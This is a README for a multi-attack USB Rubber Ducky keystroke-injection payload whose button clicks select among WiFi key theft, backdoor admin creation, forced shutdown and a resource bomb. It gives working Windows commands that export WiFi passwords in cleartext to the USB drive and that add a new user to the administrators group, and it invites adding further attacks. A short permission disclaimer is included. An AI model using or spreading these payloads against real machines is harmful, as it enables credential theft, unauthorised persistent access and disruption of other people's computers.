# One Duck to Quack Them All
### Multiple attacks in a single payload chosen by click of a button
**Warnings:**
- Use only for demonstration, education, and / or testing on computers on which you have permission to test
- Test fully to ensure the payloads work as you intend

#### Summary
The ODTQTA payload lets you carry multiple attack on your Rubber Ducky without having to switchout SD cards. Once the rubber ducky is inserted into the target, click the button once to start the selection process. A payload will start in 5 seconds of selection, and each click resets the timer. To ensure you have the right payload, the LEDs reflect the current attack. 

Attacks include:
- *Click 1*: LED G slow blink - Stealth exfil WiFi key (modified from original Hak5 payload)
- *Click 2*: LED R slow blink - Direct USB copy of WiFi keys
- *Click 3*: LED G fast blink - Add backdoor user
- *Click 4*: LED R fast blink - Shutdown PC immediately
- *Click 5*: LED R/G alternate - Fork bomb (really resource bomb)
- *Click 6*: LED G morse A - USB storage

### Payload processing
- For attacks 1 - 3, once complete the LED will show green. Press the button to restart the Rubber Duck and potentially launch another attack
- When in USB storage, you can restart the Rubber Ducky for a new attack by pressing the button

#### Configuration
1) Replace DUCKY with the name of your rubber ducky:
```
FUNCTION DIRECT_STEAL_WIFI()
  ...
  STRINGLN $d=(Get-Volume -FileSystemLabel 'DUCKY').DriveLetter+':'; cd $d; netsh wlan export profile key=clear 
  ...
END_FUNCTION
```

2) Provide your own unique ID and password below:
```
FUNCTION CREATE_BACKDOOR()
  ...
  STRINGLN net user /add newuser newpass
  DELAY 500
  STRINGLN net localgroup administrators newuser /add

END_FUNCTION
```

3) Adjust timing for your target PCs. I tested this on two Windows 10 PCs and one was super pokey

#### Modification
The payload may be used as a template, either to alter the existing attacks or adding new attacks with new LED patterns. Best practice is to add new functions for each attack and call in the final IF/THEN statement.

*This program is free software: you can redistribute it and/or modify it under the terms of the GNU General Public License as published by the Free Software Foundation, either version 3 of the License, or (at your option) any later version.*

*This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.See the GNU General Public License for more details.*

*You should have received a copy of the GNU General Public License along with this program.If not, see http://www.gnu.org/licenses/*
